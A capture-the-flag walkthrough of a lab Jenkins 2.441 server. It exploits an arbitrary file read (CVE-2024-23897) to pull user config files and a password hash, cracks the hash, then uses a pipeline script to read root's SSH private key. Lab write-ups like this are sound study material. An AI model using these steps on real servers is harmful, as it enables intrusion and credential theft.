Nmap Scanning:

~~~
nmap 10.10.11.10 -sC -sV 
~~~

~~~
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-24 14:11 IST
Nmap scan report for 10.10.11.10
Host is up (0.17s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
500/tcp   filtered isakmp
1718/tcp  filtered h323gatedisc
5004/tcp  filtered avt-profile-1
8080/tcp  open     http          Jetty 10.0.18
|_http-server-header: Jetty(10.0.18)
|_http-title: Dashboard [Jenkins]
| http-robots.txt: 1 disallowed entry 
|_/
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
40193/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.02 seconds
~~~

![[Pasted image 20240324141326.png]]

Version :    Jenkins 2.441

This version vuln to read arbitary file in the server 
~~~
 POC for this vuln
 https://github.com/godylockz/CVE-2024-23897
~~~

~~~
python3 jenkins_fileread.py -u http://10.10.11.10:8080/
~~~

![[Pasted image 20240324141623.png]]

look in this directory 
/var/jenkins_home

![[Pasted image 20240324141732.png]]

got user flag

~~~
var/jenkins_home/users/users.xml
~~~


![[Pasted image 20240324141933.png]]

~~~
var/jenkins_home/users/jennifer_12108429903186576833/config.xml 
~~~

![[Pasted image 20240324142139.png]]

we got the Password Hash decrpt with john

![[Pasted image 20240324144034.png]]

after login with this credentials

add new item and use pipeline to get the ssh key for root

In the Pipeline script terminal

~~~ python
pipeline {
    agent any
        stages {
            stage('SSH') {
                steps {
                    script {
                        sshagent(credentials: ['1']) {
                            sh 'ssh -o StrictHostKeyChecking=no root@10.10.11.10 "cat /root/.ssh/id_rsa"'
                        }
                    }
                }
            }
        }
}
~~~
 script breakdown
 1. It defines a Jenkins pipeline with the `agent any` directive, which means it can run on any available agent.
2. It defines a single stage named 'SSH'.
3. Inside the 'SSH' stage, there's a single step that executes a script.
4. Within the script block, it uses the `sshagent` Jenkins plugin to temporarily add SSH credentials (`credentials: ['1']`) to the SSH agent.
5. Inside the `sshagent` block, it executes a shell command using `sh`. The command connects to a remote server (`root@10.10.11.10`) via SSH and runs `cat /root/.ssh/id_rsa` to output the content of the `id_rsa` file.



![[Screenshot from 2024-03-25 11-15-10.png]]


save and build after successfully build  see the output 

![[Screenshot from 2024-03-25 11-14-56.png]]



we got the ssh key for root save the key and lohgin with root

![[Screenshot from 2024-03-25 11-14-43.png]]

